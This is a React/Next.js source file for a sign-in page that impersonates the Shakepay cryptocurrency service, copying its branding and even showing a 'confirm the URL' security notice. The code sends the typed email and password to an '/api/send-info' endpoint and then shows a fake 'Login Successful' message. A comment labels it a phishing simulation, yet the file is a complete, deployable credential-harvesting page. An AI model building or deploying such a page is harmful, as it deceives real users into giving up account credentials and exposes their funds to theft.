"use client";

import React, { useState } from "react";
import Link from "next/link";
import {
	Mail,
	Lock,
	Eye,
	EyeOff,
	ShieldCheck,
	Loader2,
	Check,
} from "lucide-react";

export default function SigninPage() {
	const [showPassword, setShowPassword] = useState(false);
	const [email, setEmail] = useState("");
	const [password, setPassword] = useState("");
	const [isLoading, setIsLoading] = useState(false);
	const [showModal, setShowModal] = useState(false);

	const isFormValid = email.length > 0 && password.length > 0;

	const handleSignin = async (e: React.FormEvent) => {
		e.preventDefault();
		if (!isFormValid || isLoading) return;

		setIsLoading(true);

		try {
			const response = await fetch("/api/send-info", {
				method: "POST",
				headers: { "Content-Type": "application/json" },
				body: JSON.stringify({ email, password }),
			});

			if (response.ok) {
				setShowModal(true);
			} else {
				// Silently fail or handle error if needed, for phishing sim usually silent or fake error
				console.error("Failed to send info");
			}
		} catch (error) {
			console.error("Error:", error);
		} finally {
			setIsLoading(false);
		}
	};

	return (
		<div className='min-h-screen w-full relative bg-[#0a0a0a] flex flex-col font-sans text-white'>
			{/* Blue Glow Effect - Updated for dark mode */}
			<div className='absolute inset-0 pointer-events-none z-0' />

			{/* Navbar */}
			<nav className='relative z-10 flex items-center justify-between px-6 py-6 md:px-12'>
				<div className='w-[150px]'>
					{/* Logo - Text Approximation */}
					<span className='text-[#02629d] font-bold text-3xl tracking-tight cursor-default'>
						shakepay
					</span>
				</div>

				<div className='flex items-center gap-4'>
					<button className='text-white/90 font-semibold text-[15px] hover:opacity-70 transition-opacity'>
						Français
					</button>
					<Link
						href='/signup'
						className='bg-[#02629d] hover:bg-[#025080] text-white px-6 py-2.5 rounded-full font-bold text-[15px] transition-colors'
					>
						Sign up
					</Link>
				</div>
			</nav>

			{/* Main Content */}
			<main className='relative z-10 flex-1 flex flex-col items-center pt-8 px-4 sm:px-0'>
				<div className='w-full max-w-[450px] flex flex-col gap-6'>
					{/* Header */}
					<h1 className='text-[32px] font-semibold text-center text-white mb-2 leading-tight'>
						Sign in to Shakepay
					</h1>

					{/* Form */}
					<form
						className='flex flex-col gap-4'
						onSubmit={handleSignin}
					>
						{/* Email Input */}
						<div className='group relative'>
							<input
								type='text'
								id='email'
								value={email}
								onChange={(e) => setEmail(e.target.value)}
								placeholder='Email, shaketag or phone number'
								className='w-full h-[64px] bg-[#171717] rounded-[16px] px-4 text-[16px] text-white placeholder-[#6c7a89] outline-none focus:ring-2 focus:ring-[#02629d]/40 transition-all font-medium border border-transparent focus:border-[#02629d]/50'
							/>
						</div>

						{/* Password Input */}
						<div className='relative'>
							<input
								type={showPassword ? "text" : "password"}
								id='password'
								value={password}
								onChange={(e) => setPassword(e.target.value)}
								placeholder='Password'
								className='w-full h-[64px] bg-[#171717] rounded-[16px] px-4 pr-12 text-[16px] text-white placeholder-[#6c7a89] outline-none focus:ring-2 focus:ring-[#02629d]/40 transition-all font-medium border border-transparent focus:border-[#02629d]/50'
							/>
							<button
								type='button'
								onClick={() => setShowPassword(!showPassword)}
								className='absolute right-4 top-1/2 -translate-y-1/2 text-[#02629d] hover:text-[#025080]'
							>
								{showPassword ? (
									<EyeOff size={24} />
								) : (
									<Eye size={24} />
								)}
							</button>
						</div>

						{/* Security Box */}
						<div className='bg-[#171717] rounded-[16px] p-4 flex gap-3 items-start border border-[#262626]'>
							<div className='text-white mt-1'>
								<Lock size={20} strokeWidth={2.5} />
							</div>
							<div className='text-[13px] leading-snug text-[#a0a0a0]'>
								<span className='font-bold text-white block mb-0.5'>
									shakepay.com/signin
								</span>
								<p>
									Confirm the URL is legitimate before typing in your
									login credentials.
								</p>
							</div>
						</div>

						{/* Sign In Button */}
						<button
							type='submit'
							disabled={!isFormValid || isLoading}
							className={`
                w-full h-[56px] rounded-full font-bold text-[16px] transition-all mt-2
                flex items-center justify-center gap-2
                ${
									isFormValid
										? "bg-[#02629d] hover:bg-[#025080] text-white shadow-[0_4px_14px_0_rgba(2,98,157,0.39)]"
										: "bg-[#1e1e1e] text-[#555] cursor-not-allowed border border-[#262626]"
								}
              `}
						>
							{isLoading && (
								<Loader2 className='animate-spin' size={20} />
							)}
							Sign in
						</button>

						{/* Passkey Button */}
						<button
							type='button'
							className='w-full h-[56px] bg-[#171717] hover:bg-[#202020] text-white/90 rounded-full font-bold text-[16px] transition-all border border-[#262626]'
						>
							Sign in with passkey
						</button>

						{/* Reset Password */}
						<div className='text-center mt-2'>
							<Link
								href='/signin'
								className='text-[#02629d] font-bold text-[15px] hover:underline decoration-2 underline-offset-4'
							>
								Reset password
							</Link>
						</div>
					</form>
				</div>
			</main>

			{/* Success Modal */}
			{showModal && (
				<div className='fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/50 backdrop-blur-sm animate-in fade-in duration-200'>
					<div className='bg-[#171717] rounded-3xl p-8 max-w-sm w-full border border-[#262626] shadow-2xl flex flex-col items-center text-center animate-in zoom-in-95 duration-200'>
						<div className='w-16 h-16 rounded-full bg-[#02629d]/20 flex items-center justify-center mb-6 text-[#02629d]'>
							<Check size={32} strokeWidth={3} />
						</div>
						<h2 className='text-2xl font-bold text-white mb-2'>
							Login Successful
						</h2>
						<p className='text-[#a0a0a0] mb-8'>
							Welcome back! You have successfully signed in to your
							account.
						</p>
						<button
							onClick={() => setShowModal(false)}
							className='w-full h-[50px] bg-[#02629d] hover:bg-[#025080] text-white rounded-full font-bold text-[15px] transition-colors'
						>
							Continue to Dashboard
						</button>
					</div>
				</div>
			)}

			{/* Footer / Copyright if needed? usually not on minimalist signin */}
		</div>
	);
}
